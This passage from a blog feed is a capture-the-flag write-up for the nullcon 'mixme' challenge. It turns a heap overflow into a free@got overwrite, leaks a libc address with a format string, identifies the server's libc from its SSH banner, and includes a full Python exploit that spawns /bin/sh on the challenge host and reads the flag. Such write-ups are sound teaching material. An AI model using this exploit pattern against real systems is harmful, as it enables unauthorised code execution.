-cs             0x73 0x73
-ss             0x7b 0x7b
-ds             0x7b 0x7b
-es             0x7b 0x7b
-fs             0x0  0x0
-gs             0x33 0x33
-gdb-peda$ p system
-$1 = {&lt;text variable, no debug info&gt;} 0xb7636060 &lt;system&gt;
-gdb-peda$ x/4x $esp
-0xbf95245c: 0x08048bb8  0x0843b0c8  0x0843b0c8  0x00000004
-
-gdb-peda$ x/4x $eax
-0x843b0c8:  0x43434343  0x00000000
-</code></pre>
-
-<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>
-
-<h2>Turning the heap overflow into a format string vulnerability</h2>
-
-<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>
-
-<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>
-
-<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>
-
-<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>
-
-<h2>What&rsquo;s that gem?</h2>
-
-<p>Examining the stack, I dumped the following data:</p>
-
-<pre><code># local binary
-85850c8-122-b75c77b0-122-85850a0-85850a0-63... &lt;snip&gt;
-</code></pre>
-
-<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>
-
-<pre><code># remote binary
-83370c8-122-b75c0024-122-83370a0-83370a0-b7000063-... &lt;snip&gt;
-936e0c8-122-b764a024-122-936e0a0-936e0a0-b7000063-... &lt;snip&gt;
-</code></pre>
-
-<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>
-
-<h2>Finding the correct libc</h2>
-
-<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme$ ssh test@54.163.248.69 -vvv
-OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013
-debug1: Reading configuration data /etc/ssh/ssh_config
-debug1: /etc/ssh/ssh_config line 19: Applying options for *
-debug2: ssh_connect: needpriv 0
-debug1: Connecting to 54.163.248.69 [54.163.248.69] port 22.
-debug1: Connection established.
-debug1: identity file /home/bas/.ssh/id_rsa type -1
-debug1: identity file /home/bas/.ssh/id_rsa-cert type -1
-debug1: identity file /home/bas/.ssh/id_dsa type -1
-debug1: identity file /home/bas/.ssh/id_dsa-cert type -1
-debug1: identity file /home/bas/.ssh/id_ecdsa type -1
-debug1: identity file /home/bas/.ssh/id_ecdsa-cert type -1
-debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
-&lt;snip&gt;
-</code></pre>
-
-<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme/libc$ for i in `ls`; do echo $i; echo; xxd $i | egrep '83.?c0.?01.?75'; echo; done
-
-
-libc-2.15-0ubuntu10.9.so
-
-0043740: 8934 24e8 f8f4 0200 83c0 0175 b0c7 8570  .4$........u...p
-00460a0: 0000 0089 3424 e895 cb02 0083 c001 75bb  ....4$........u.
-0046720: 0200 83c0 0175 80c7 8570 fbff ffff ffff  .....u...p......
-0046810: 2cc4 0200 83c0 0175 a5c7 8570 fbff ffff  ,......u...p....
-0046890: e8ab c302 0083 c001 75ac c785 70fb ffff  ........u...p...
-0047320: 4424 04e8 18b9 0200 83c0 0175 80c7 8570  D$.........u...p
-0047410: 0000 0089 3424 e825 b802 0083 c001 75a4  ....4$.%......u.
-005a180: 83c0 0175 a4c7 85b0 efff ffff ffff ffe9  ...u............
-005b410: 3424 e8f9 1001 0083 c001 75ae c785 b0ef  4$........u.....
-005c370: 0089 3424 e897 0101 0083 c001 7580 c785  ..4$........u...
-00674c0: 0a00 0000 8904 24e8 74b7 0000 83c0 0175  ......$.t......u
-
-libc-2.16-0ubuntu6.so
-
-0047b50: 83c0 0175 a8e9 97bf ffff 81e1 ff00 0000  ...u............
-005ad90: 0083 c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..[....M..E
-0066ab0: 7cb4 0000 83c0 0175 918d b426 0000 0000  |......u...&amp;....
-
-libc-2.19-0ubuntu6.4.so
-
-00471c0: 0489 3424 e817 9e02 0083 c001 758a e9d1  ..4$........u...
-0047920: 24e8 ba96 0200 83c0 0175 c5e9 74c2 ffff  $........u..t...
-005a850: 8904 24e8 d801 0100 83c0 0175 b8e9 04cc  ..$........u....
-005b3a0: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
-0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
-
-libc-2.19-13ubuntu3.so
-
-00472a0: 0489 3424 e877 9c02 0083 c001 758a e9d1  ..4$.w......u...
-0047a00: 0000 8934 24e8 1695 0200 83c0 0175 c5e9  ...4$........u..
-0050e40: 8904 24e8 6879 0100 83c0 0175 b8e9 04cc  ..$.hy.....u....
-0051990: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
-0066100: 1cae 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
-</code></pre>
-
-<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>
-
-<pre><code>0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
-</code></pre>
-
-<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>
-
-<pre><code class="bash">LD_PRELOAD=./libc-2.19-0ubuntu6.14.so ./mixme
-</code></pre>
-
-<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>
-
-<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>
-
-<pre><code class="python">import re
-import string
-import struct
-import socket
-import time
-import telnetlib
-import sys
-
-def p(x):
-    return struct.pack('&lt;L', x)
-
-# function to send commands to the binary
-def z(sock, x):
-    sock.send(x + '\n')
-    time.sleep(0.01)
-    data = sock.recv(200)
-    time.sleep(0.01)
-    return data
-
-# connect to remote host
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('54.163.248.69', 9005))
-
-# receive banner
-s.recv(512)
-
-# ask the binary to store three notes
-# we'll overflow a into b later on
-z(s, "store")
-z(s, "a")
-z(s, "4")
-z(s, "AAAA")
-
-z(s, "store")
-z(s, "b")
-z(s, "4")
-z(s, "BBBB")
-
-# the third note will hold our format string
-z(s, "store")
-z(s, "c")
-format_str = "--%3$x"
-z(s, str(len(format_str)))
-z(s, format_str)
-
-# edit a with a large value
-# this overflows and overwrites the note_info struct of b
-# the pointer to the data is overwriting with free@got
-print "[+] overflowing a to set b to free@got"
-z(s, 'edit')
-z(s, 'a')
-z(s, '40')
-z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
-#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got
-
-# overwrite free@got with printf
-print "[+] replacing free() with printf()"
-z(s, 'edit')
-z(s, 'b')
-z(s, '4')
-z(s, p(0x080485f0)) # free@got overwritten with printf
-
-# now 'get' c and trigger the format string vulnerability
-print "[+] triggering format string"
-z(s, "get")
-z(s, "c")
-data = z(s, str(len(format_str)))
-time.sleep(0.1)
-
-# this proved to be a bit finicky:
-data += s.recv(256)
-data += s.recv(256)
-
-print data
-# grab leaked libc address
-m = re.findall(r'x--(.*)cSel', data)
-if m: 
-    print m
-    leak = "0x"+m[0]
-    leak_hex = int(leak, 16)
-    print "[+] found first addr: {}".format(hex(leak_hex))
-    system = leak_hex - 155428
-    print "[+] system @ {}".format(hex(system))
-
-# repeat the same trick, but this time, overwrite free@got with system()
-# first note contains /bin/sh, used as argument for system()
-z(s, "store")
-z(s, "sh")
-z(s, "7")
-z(s, "/bin/sh")
-
-z(s, "store")
-z(s, "t")
-z(s, "4")
-z(s, "TTTT")
-
-z(s, "store")
-z(s, "q")
-z(s, "4")
-z(s, "QQQQ")
-
-print "[+] overflowing t to set q to free@got"
-z(s, 'edit')
-z(s, 't')
-z(s, '40')
-z(s, "A"*12+"\x29\x00\x00\x00\x71\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
-#     ^ overflow              ^ restore 'q'           ^ size of q  ^ free@got
-
-print "[+] replacing free() with system()"
-z(s, 'edit')
-z(s, 'q')
-z(s, '4')
-z(s, p(system))     # free@got overwritten with system
-
-# trigger system('/bin/sh')
-z(s, 'get')
-z(s, 'sh')  # this note contains '/bin/sh' and those contents are passed to system()
-z(s, '7')
-
-# shell spawned, interact with it!
-t=telnetlib.Telnet()
-t.sock=s
-t.interact()
-
-s.close()
-</code></pre>
-
-<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>
-
-<pre><code class="bash">root@ubuntu-VirtualBox:/home/ubuntu/nullcon/mixme# python exploit.py
-[+] overflowing a to set b to free@got
-[+] replacing free() with printf()
-[+] triggering format string
-Name: Size: --%3$x--b768d024cSelect op (store/get/edit/exit): 
-['b768d024']
-[+] found first addr: 0xb768d024L
-[+] system @ 0xb7667100L
-[+] overflowing t to set q to free@got
-[+] replacing free() with system()
-/bin/sh
-id
-uid=1005 gid=1005 groups=0
-cat flag.txt
-aw3s0m3++_hipp1e_pwn_r0ckst4r
-</code></pre>
-
-<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes left for the ctf!</p>
 ]]></content>
   </entry>
   
